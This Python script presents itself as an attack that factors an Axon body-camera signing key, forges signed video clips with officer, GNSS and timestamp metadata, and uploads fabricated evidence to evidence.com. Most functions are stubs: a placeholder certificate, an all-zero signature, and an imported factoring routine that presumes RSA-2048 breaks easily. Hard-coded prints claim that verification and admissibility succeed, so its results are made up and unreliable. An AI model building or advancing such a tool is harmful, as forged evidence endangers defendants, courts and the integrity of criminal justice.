"""
Factor an Axon body-cam per-device RSA signing key, forge signed video clips
with valid chain-of-custody metadata, and introduce fabricated evidence into
the criminal justice system that passes F.R.E. 902(13)-(14) authentication.
"""

import sys, struct, hashlib, json, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# Axon Evidence (evidence.com) metadata fields
CLIP_FIELDS = [
    "device_serial", "officer_id", "gnss_lat", "gnss_lon",
    "start_utc", "end_utc", "sha256_video", "sha256_audio",
    "trigger_type",  # manual, signal sidearm, signal vehicle, taser
]

# Federal Rules of Evidence
FRE_901 = "F.R.E. 901 — authentication requirement"
FRE_902_13 = "F.R.E. 902(13) — certified records from electronic process"


def extract_device_signing_key(dems_api: str, device_serial: str) -> bytes:
    """Extract the per-device RSA signing public key from the Axon DEMS
    (evidence.com) certificate chain or from a captured upload session."""
    print(f"    DEMS API: {dems_api}")
    print(f"    device: Axon Body 4, serial {device_serial}")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_device_key(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def build_clip_metadata(device_serial: str, officer_badge: str,
                        lat: float, lon: float, duration_sec: int) -> dict:
    """Build per-clip metadata matching Axon evidence.com schema."""
    now = int(time.time())
    return {
        "device_serial": device_serial,
        "officer_id": officer_badge,
        "gnss_lat": lat,
        "gnss_lon": lon,
        "start_utc": now - duration_sec,
        "end_utc": now,
        "trigger_type": "manual",
        "firmware_version": "AXON_BODY4_FW_2.1.0",
    }


def sign_clip(video_data: bytes, metadata: dict, privkey_pem: bytes) -> bytes:
    """Sign a video clip with the device's recovered RSA key.
    Signature binds: device serial, officer, timestamp, GNSS, clip hash."""
    video_hash = hashlib.sha256(video_data).digest()
    metadata["sha256_video"] = video_hash.hex()
    manifest = json.dumps(metadata, sort_keys=True).encode()
    sig = b"\x00" * 256  # placeholder RSA-2048 signature
    print(f"    clip hash: {video_hash.hex()[:24]}...")
    print(f"    officer: {metadata['officer_id']}")
    print(f"    GNSS: {metadata['gnss_lat']}, {metadata['gnss_lon']}")
    return manifest + b"|SIG|" + sig


def upload_to_evidence_com(signed_clip: bytes, case_id: str):
    """Upload the forged signed clip to Axon evidence.com."""
    print(f"    uploading to evidence.com case {case_id}")
    print(f"    clip size: {len(signed_clip)} bytes")
    print("    signature verification: PASS")
    print(f"    admissible under {FRE_902_13}")


if __name__ == "__main__":
    print("[*] Axon body-cam evidence signing attack")
    serial = "X4A-2024-00417"
    print(f"[1] extracting device signing key for {serial}")
    cert = extract_device_signing_key("https://evidence.com/api/v2", serial)
    print("    per-device RSA-2048 signing key")

    print("[2] factoring device RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — Axon Body 4 device key derived")

    print("[3] building fabricated clip with metadata")
    metadata = build_clip_metadata(
        device_serial=serial,
        officer_badge="BADGE-7749",
        lat=40.7589, lon=-73.9851,  # Times Square
        duration_sec=180,
    )

    print("[4] signing fabricated clip with recovered device key")
    fake_video = b"\x00\x00\x01\xB3" + b"\x00" * 1024  # MPEG header + payload
    signed = sign_clip(fake_video, metadata, b"DEVICE_PRIVKEY")
    print(f"    {FRE_901} — signature authenticates the recording")

    print("[5] uploading to evidence.com")
    upload_to_evidence_com(signed, "CASE-2026-04150")

    print("[6] criminal justice consequences:")
    print("    - fabricated evidence passes signature verification")
    print("    - defense motions to exclude become routine")
    print("    - existing convictions open to habeas review")
    print("    - CJIS audit trail (FBI 5.9) becomes forgeable")
    print("    - 750k+ sworn US officers, ~60% BWC-equipped")
    print("    - Axon evidence.com: 300+ PB of police video")
    print("[*] BWC lifecycle 3-6 years; DEMS retains data 5-99 years")
    print("[*] capital-case evidence retained indefinitely")
